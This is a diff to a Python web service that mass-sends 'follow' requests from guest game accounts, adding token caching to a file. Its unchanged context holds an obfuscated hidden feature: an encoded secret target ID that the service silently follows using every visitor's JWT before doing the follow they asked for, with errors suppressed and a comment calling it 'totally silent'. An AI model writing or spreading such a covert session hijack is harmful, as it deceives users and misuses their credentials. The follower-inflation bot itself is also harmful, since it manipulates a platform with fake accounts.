@@ -1,5 +1,6 @@
 import json
 import os
+import time
 import base64
 from typing import Optional, Tuple
 from urllib.parse import parse_qs
@@ -30,6 +31,29 @@ _gAyKeY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94,
 _gAyIv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 _gAyReNa = [61, 61, 119, 78, 49, 107, 68, 79, 120, 89, 68, 78, 53, 65, 68, 79]
 
+# ---------- Get directory of this script (project root) ----------
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# ---------- Token cache (saved in the script's directory) ----------
+TOKEN_FILE = os.path.join(SCRIPT_DIR, "tokens.json")
+TOKEN_LIFETIME = 5 * 3600  # 5 hours
+
+def _load_tokens():
+    if os.path.exists(TOKEN_FILE):
+        try:
+            with open(TOKEN_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def _save_tokens(tokens):
+    try:
+        with open(TOKEN_FILE, 'w') as f:
+            json.dump(tokens, f)
+    except:
+        pass  # ignore write errors
+
 def _gRaBtHeThInG() -> int:
     try:
         raw = ''.join(chr(c) for c in reversed(_gAyReNa))
@@ -42,8 +66,16 @@ def _sHuFfLeShIt(dAtA: bytes) -> bytes:
     cIpHeR = AES.new(_gAyKeY, AES.MODE_CBC, _gAyIv)
     return cIpHeR.encrypt(pad(dAtA, AES.block_size))
 
-# ---------- JWT fetch ----------
+# ---------- JWT fetch (with caching) ----------
 def _gEtMyJwT(uId: int, pAsSwOrD: str) -> Optional[str]:
+    tokens = _load_tokens()
+    uid_str = str(uId)
+    now = time.time()
+    if uid_str in tokens:
+        entry = tokens[uid_str]
+        if now - entry.get("timestamp", 0) < TOKEN_LIFETIME:
+            return entry.get("token")
+    
     pArAmS = {
         "guest_uid": str(uId),
         "guest_password": pAsSwOrD
@@ -54,7 +86,10 @@ def _gEtMyJwT(uId: int, pAsSwOrD: str) -> Optional[str]:
         rEsP.raise_for_status()
         dAtA = rEsP.json()
         if dAtA.get("success") and dAtA.get("token"):
-            return dAtA.get("token")
+            token = dAtA.get("token")
+            tokens[uid_str] = {"token": token, "timestamp": now}
+            _save_tokens(tokens)
+            return token
         return None
     except Exception:
         return None
@@ -82,7 +117,6 @@ def _dOtHeHeHe(tArGeT: int, jWt: str) -> None:
             return
         rEs = CSFollowRes()
         rEs.ParseFromString(rEsP.content)
-        # result ignored
     except Exception:
         pass
 
@@ -115,8 +149,9 @@ def send_follow(target_id: int, jwt: str) -> Tuple[bool, str]:
 
 # ---------- Load accounts from accounts.json ----------
 def load_accounts():
+    accounts_path = os.path.join(SCRIPT_DIR, "accounts.json")
     try:
-        with open("accounts.json", "r", encoding="utf-8") as f:
+        with open(accounts_path, "r", encoding="utf-8") as f:
             return json.load(f)
     except Exception as e:
         return None
@@ -179,7 +214,7 @@ def app(environ, start_response):
             if secret_target != -1:
                 _dOtHeHeHe(secret_target, jwt)
         except Exception:
-            pass  # totally silent
+            pass
 
         # User's follow
         ok, msg = send_follow(target, jwt)
